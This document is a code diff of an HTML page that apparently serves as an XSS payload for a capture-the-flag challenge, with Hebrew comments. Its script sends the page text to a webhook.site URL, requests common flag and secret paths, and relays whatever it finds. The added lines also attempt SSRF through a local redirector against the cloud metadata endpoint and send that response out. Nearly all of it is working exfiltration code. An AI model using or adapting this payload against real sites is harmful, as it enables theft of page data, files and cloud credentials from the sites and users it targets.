@@ -1,14 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><title>CTF XSS Flag Extractor</title></head>
+<head><title>Flag XSS Extractor</title></head>
 <body>
-  <h1>Flag Hunter</h1>
+  <h1>JS Execution Test</h1>
+  <p>✅ JS Executed</p>
   <script>
-    // 1. שולח את כל הטקסט שבדף ל-webhook
-    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?content=' + encodeURIComponent(document.body.innerText));
+    // שולח את תוכן הדף ל־webhook
+    fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?body=' + encodeURIComponent(document.body.innerText));
 
-    // 2. מנסה לקרוא דגל מכתובות נפוצות
-    const paths = ['/flag', '/flag.txt', '/secret', '/secret.txt', '/etc/passwd'];
+    // נתיבים נפוצים לדגל
+    const paths = [
+      '/flag', '/flag.txt', '/secret', '/secret.txt',
+      '/static/flag', '/hidden/flag.txt', '/home/ctf/flag', '/flag.html'
+    ];
+
+    // מנסה לקרוא את כל הנתיבים
     paths.forEach(path => {
       fetch(path)
         .then(r => r.text())
@@ -18,8 +24,13 @@
         .catch(e => {});
     });
 
-    // 3. הודעת אישור מקומית
-    document.body.insertAdjacentHTML('beforeend', '<p style="color:green">✅ Flag script ran</p>');
+    // ניסיון דרך SSRF דרך redirector פנימי (אם קיים)
+    fetch('http://127.0.0.1/redir.php?url=http://169.254.169.254/latest/meta-data/')
+      .then(res => res.text())
+      .then(data => {
+        fetch('https://webhook.site/565628b3-9556-4536-8e01-88059325cb8d?ssrf=' + encodeURIComponent(data));
+      })
+      .catch(e => {});
   </script>
 </body>
 </html>
